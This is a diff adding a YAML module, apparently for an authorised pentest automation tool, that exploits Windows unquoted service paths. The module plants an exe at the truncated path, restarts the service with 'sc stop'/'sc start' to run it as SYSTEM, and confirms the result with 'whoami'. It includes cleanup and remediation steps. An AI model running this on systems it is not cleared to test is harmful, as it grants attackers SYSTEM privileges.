@@ -1,0 +1,61 @@
+# Unquoted service path → SYSTEM
+#
+# Windows Service Control Manager launches services by splitting the
+# binPath value on spaces when it isn't quoted, then trying each
+# space-truncated prefix with `.exe` appended until one exists. When
+# an intermediate directory is writable, planting an .exe there wins
+# before the intended binary — and the SCM launches it as SYSTEM.
+#
+# Classic example: `C:\Program Files\My App\svc.exe` (unquoted) has SCM
+# try `C:\Program.exe` first, then `C:\Program Files\My.exe`, then the
+# real path. If `C:\` is writable (rare on modern Windows but happens
+# on custom drives), the operator plants `C:\Program.exe` and wins.
+#
+# Ported from privesc._d_win_unquoted. Emits ONE vector PER unquoted
+# service in facts.unquoted_services via the per-item iteration
+# predicate.
+technique: T1574.010
+name: unquoted service path ({{name}}) → SYSTEM
+tactic: [privilege-escalation]
+platform: [windows]
+key: 'unquoted:{{path}}'
+ranking:
+  exploitability: medium         # depends on the candidate parent dir being writable
+  safety: config-change          # plants an exe, restarts a service
+  detection: moderate
+detect:
+  # Named-service variant — the operator has a concrete service name to
+  # sc stop / sc start, so this variant auto-fires. Unnamed unquoted
+  # services (enumerator recovered path only) use the sibling
+  # T1574.010-unquoted-service-path-unnamed.yaml — same predicate,
+  # inverse filter, guidance-only command.
+  unquoted_services: {has_name: true}
+execute:
+  # `sc stop`+`sc start` restarts the service, which the SCM launches
+  # through the unquoted binPath — planting an exe at `candidate` wins
+  # the space-truncated prefix race. `type <proof>` reads back the
+  # whoami the payload wrote, so the operator gets uid=0 confirmation
+  # in the terminal.
+  command: 'sc stop {{name}} & sc start {{name}} & ping -n 4 127.0.0.1 >nul & type {{proof}}'
+  builds:
+    - format: exe
+      as: '{{candidate}}'
+      run: 'cmd /c whoami > {{proof}}'
+verify:
+  success: "NT AUTHORITY"
+cleanup:
+  command: 'del {{candidate}} & del {{proof}}'
+report:
+  vector_type: unquoted_service
+  evidence: "unquoted service path: {{path}}"
+  description: >
+    Service Control Manager launches services with an unquoted binPath
+    by walking space-truncated prefixes and appending `.exe` — any
+    writable intermediate directory lets an operator plant a payload
+    that wins the search. The SCM launches it as SYSTEM.
+  remediation: >
+    Quote the service's ImagePath value:
+    `sc config <svc> binPath= "\"C:\\Program Files\\...\""`.
+    Or ensure no intermediate directory on the path is writable by
+    non-admins — check the ACL on every parent from C:\ down.
+  refs: [T1574.010, unquoted-service-path]
